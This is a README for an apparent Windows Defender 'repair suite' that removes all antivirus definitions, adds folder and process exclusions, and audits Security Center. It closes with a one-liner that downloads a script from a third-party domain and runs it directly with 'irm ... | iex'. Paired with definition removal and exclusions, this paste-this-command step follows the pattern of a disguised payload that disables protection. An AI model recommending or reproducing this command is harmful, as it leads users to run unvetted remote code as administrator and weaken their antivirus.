# 🛡️ Windows Defender Signature Reset & Exclusion Repair Suite

A production-grade, interactive administration suite to reset corrupted Windows Defender signatures, manage folder and process exclusions, and audit the WMI Security Center repository.

---

## 🚀 Key Features

1. **Defender Signature Definition Reset**:
   - Flushes corrupted definition databases using `MpCmdRun.exe -RemoveDefinitions -All`.
   - Forces fresh definition downloads from Microsoft Update servers.
2. **Interactive Exclusion Manager**:
   - Displays all active folder exclusions (`ExclusionPath`) and process exclusions (`ExclusionProcess`).
   - Interactive prompt to add new folder or process exclusions cleanly.
3. **Security Center WMI Auditor**:
   - Audits `root\SecurityCenter2` WMI namespace to inspect registered antivirus engine health.

---

## 📋 Interactive Approval Engine

Every action prompts the administrator in yellow before making any changes:
```text
>>> Remove all current Windows Defender definitions (MpCmdRun.exe -RemoveDefinitions -All)?
Proceed? (Y/N)
```
- Enter `Y` to execute the step.
- Enter `N` (or press Enter) to skip safely.

---

## 💻 Execution

### Run Locally
Right-click `Run-As-Administrator.bat` and select **Run as Administrator**.

### Web One-Liner
```powershell
[Net.ServicePointManager]::SecurityProtocol = 3072; irm https://toolkit.omvihub.in/defender | iex
```
